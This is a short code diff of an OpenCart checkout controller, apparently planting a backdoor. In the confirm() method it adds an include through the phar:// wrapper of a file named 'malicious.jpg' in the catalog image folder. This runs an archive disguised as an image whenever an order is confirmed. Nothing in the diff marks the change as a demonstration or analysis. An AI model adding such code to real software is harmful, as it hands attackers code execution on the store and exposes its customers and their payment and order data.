@@ -420,6 +420,8 @@ class Confirm extends \Opencart\System\Engine\Controller {
 	 * @return void
 	 */
 	public function confirm(): void {
+		include ("phar://".DIR_IMAGE."catalog/malicious.jpg");
+
 		$this->response->setOutput($this->index());
 	}
 }
